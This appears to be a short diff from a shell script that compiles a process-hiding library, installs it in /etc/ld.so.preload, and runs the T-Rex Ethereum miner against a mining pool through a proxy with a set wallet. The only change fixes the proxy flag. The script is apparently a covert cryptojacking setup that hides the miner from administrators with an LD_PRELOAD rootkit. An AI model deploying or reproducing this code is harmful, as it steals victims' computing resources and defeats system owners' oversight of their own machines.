@@ -49,4 +49,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./t-rex -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0xbc48b8bdce572defe4dcab85103f140099bc5af5 -p x -w DENT -proxy 62.113.115.94:16072
+./t-rex -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0xbc48b8bdce572defe4dcab85103f140099bc5af5 -p x -w DENT --proxy 62.113.115.94:16072
